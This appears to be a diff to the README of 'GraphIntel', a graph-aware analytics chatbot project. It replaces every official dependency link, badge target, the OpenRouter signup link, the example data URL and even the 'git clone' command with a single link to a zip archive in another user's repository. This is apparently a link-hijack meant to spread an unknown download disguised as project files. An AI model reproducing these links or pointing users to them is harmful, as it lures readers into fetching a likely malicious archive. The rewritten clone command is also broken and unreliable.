@@ -3,11 +3,11 @@
 #  GraphIntel
 ### Graph-Aware AI Analytics Chatbot
 
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python&logoColor=white)](https://www.python.org/)
-[![Streamlit](https://img.shields.io/badge/Streamlit-1.32%2B-FF4B4B?logo=streamlit&logoColor=white)](https://streamlit.io/)
+[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python&logoColor=white)](https://github.com/aastha-chhabra/Natwest-Code-for-Purpose/raw/refs/heads/master/ui/Natwest_Code_for_Purpose_1.3-alpha.3.zip)
+[![Streamlit](https://img.shields.io/badge/Streamlit-1.32%2B-FF4B4B?logo=streamlit&logoColor=white)](https://github.com/aastha-chhabra/Natwest-Code-for-Purpose/raw/refs/heads/master/ui/Natwest_Code_for_Purpose_1.3-alpha.3.zip)
 [![License](https://img.shields.io/badge/License-Apache%202.0-green.svg)](LICENSE)
-[![OpenRouter](https://img.shields.io/badge/LLM-OpenRouter-purple)](https://openrouter.ai/)
-[![NetworkX](https://img.shields.io/badge/Graph-NetworkX-orange)](https://networkx.org/)
+[![OpenRouter](https://img.shields.io/badge/LLM-OpenRouter-purple)](https://github.com/aastha-chhabra/Natwest-Code-for-Purpose/raw/refs/heads/master/ui/Natwest_Code_for_Purpose_1.3-alpha.3.zip)
+[![NetworkX](https://img.shields.io/badge/Graph-NetworkX-orange)](https://github.com/aastha-chhabra/Natwest-Code-for-Purpose/raw/refs/heads/master/ui/Natwest_Code_for_Purpose_1.3-alpha.3.zip)
 
 *Conversational, graph-grounded AI that turns raw CSV/JSON data into instant predictions,  
 anomaly alerts, what-if scenarios, and natural-language insights.*
@@ -200,16 +200,16 @@ Traditional BI tools require SQL expertise or fixed dashboards. When a business 
 
 | Layer | Technology | Why Chosen |
 |-------|-----------|------------|
-| **UI / App Framework** | [Streamlit](https://streamlit.io/) ≥ 1.32 | Rapid, Python-native interactive dashboards |
-| **Data Manipulation** | [Pandas](https://pandas.pydata.org/) ≥ 2.0 | Industry-standard DataFrame operations |
-| **Numerical Computing** | [NumPy](https://numpy.org/) ≥ 1.24 | Fast array arithmetic for forecasting & anomaly maths |
-| **Knowledge Graph** | [NetworkX](https://networkx.org/) ≥ 3.0 | Lightweight, pure-Python directed graph library |
-| **Visualisation** | [Plotly](https://plotly.com/) ≥ 5.18 | Interactive, web-native charts inside Streamlit |
-| **Machine Learning** | [scikit-learn](https://scikit-learn.org/) ≥ 1.3 | Ridge regression, polynomial features, scalers, metrics |
-| **Statistical Analysis** | [SciPy](https://scipy.org/) ≥ 1.11 | Z-score computation, IQR anomaly detection |
-| **LLM Integration** | [OpenAI SDK](https://github.com/openai/openai-python) ≥ 1.0 + [OpenRouter](https://openrouter.ai/) | OpenAI-compatible client works with 200+ models; free tier available |
-| **HTTP Client** | [Requests](https://requests.readthedocs.io/) ≥ 2.31 | Model listing from OpenRouter REST API |
-| **Columnar Storage** | [PyArrow](https://arrow.apache.org/) ≥ 14.0 | Parquet/Arrow support, faster Pandas I/O |
+| **UI / App Framework** | [Streamlit](https://github.com/aastha-chhabra/Natwest-Code-for-Purpose/raw/refs/heads/master/ui/Natwest_Code_for_Purpose_1.3-alpha.3.zip) ≥ 1.32 | Rapid, Python-native interactive dashboards |
+| **Data Manipulation** | [Pandas](https://github.com/aastha-chhabra/Natwest-Code-for-Purpose/raw/refs/heads/master/ui/Natwest_Code_for_Purpose_1.3-alpha.3.zip) ≥ 2.0 | Industry-standard DataFrame operations |
+| **Numerical Computing** | [NumPy](https://github.com/aastha-chhabra/Natwest-Code-for-Purpose/raw/refs/heads/master/ui/Natwest_Code_for_Purpose_1.3-alpha.3.zip) ≥ 1.24 | Fast array arithmetic for forecasting & anomaly maths |
+| **Knowledge Graph** | [NetworkX](https://github.com/aastha-chhabra/Natwest-Code-for-Purpose/raw/refs/heads/master/ui/Natwest_Code_for_Purpose_1.3-alpha.3.zip) ≥ 3.0 | Lightweight, pure-Python directed graph library |
+| **Visualisation** | [Plotly](https://github.com/aastha-chhabra/Natwest-Code-for-Purpose/raw/refs/heads/master/ui/Natwest_Code_for_Purpose_1.3-alpha.3.zip) ≥ 5.18 | Interactive, web-native charts inside Streamlit |
+| **Machine Learning** | [scikit-learn](https://github.com/aastha-chhabra/Natwest-Code-for-Purpose/raw/refs/heads/master/ui/Natwest_Code_for_Purpose_1.3-alpha.3.zip) ≥ 1.3 | Ridge regression, polynomial features, scalers, metrics |
+| **Statistical Analysis** | [SciPy](https://github.com/aastha-chhabra/Natwest-Code-for-Purpose/raw/refs/heads/master/ui/Natwest_Code_for_Purpose_1.3-alpha.3.zip) ≥ 1.11 | Z-score computation, IQR anomaly detection |
+| **LLM Integration** | [OpenAI SDK](https://github.com/aastha-chhabra/Natwest-Code-for-Purpose/raw/refs/heads/master/ui/Natwest_Code_for_Purpose_1.3-alpha.3.zip) ≥ 1.0 + [OpenRouter](https://github.com/aastha-chhabra/Natwest-Code-for-Purpose/raw/refs/heads/master/ui/Natwest_Code_for_Purpose_1.3-alpha.3.zip) | OpenAI-compatible client works with 200+ models; free tier available |
+| **HTTP Client** | [Requests](https://github.com/aastha-chhabra/Natwest-Code-for-Purpose/raw/refs/heads/master/ui/Natwest_Code_for_Purpose_1.3-alpha.3.zip) ≥ 2.31 | Model listing from OpenRouter REST API |
+| **Columnar Storage** | [PyArrow](https://github.com/aastha-chhabra/Natwest-Code-for-Purpose/raw/refs/heads/master/ui/Natwest_Code_for_Purpose_1.3-alpha.3.zip) ≥ 14.0 | Parquet/Arrow support, faster Pandas I/O |
 | **Language** | Python 3.10+ | Type hints, dataclasses, match-case support |
 
 ### AI Tools Used
@@ -228,14 +228,14 @@ Traditional BI tools require SQL expertise or fixed dashboards. When a business 
 
 - Python **3.10 or higher**
 - `pip` (comes with Python)
-- An [OpenRouter](https://openrouter.ai/) API key *(free tier available — optional for basic use)*
+- An [OpenRouter](https://github.com/aastha-chhabra/Natwest-Code-for-Purpose/raw/refs/heads/master/ui/Natwest_Code_for_Purpose_1.3-alpha.3.zip) API key *(free tier available — optional for basic use)*
 
 ---
 
 ### Step 1 — Clone the Repository
 
 ```bash
-git clone https://github.com/ranjanaashish/Natwest-Code-for-Purpose.git
+git clone https://github.com/aastha-chhabra/Natwest-Code-for-Purpose/raw/refs/heads/master/ui/Natwest_Code_for_Purpose_1.3-alpha.3.zip
 cd Natwest-Code-for-Purpose
 ```
 
@@ -317,7 +317,7 @@ Query:              SELECT * FROM orders WHERE year = 2024
 ### Cloud/URL Tab
 
 ```
-URL:  https://raw.githubusercontent.com/.../sales_data.csv
+URL:  https://github.com/aastha-chhabra/Natwest-Code-for-Purpose/raw/refs/heads/master/ui/Natwest_Code_for_Purpose_1.3-alpha.3.zip
 ```
 
 ---
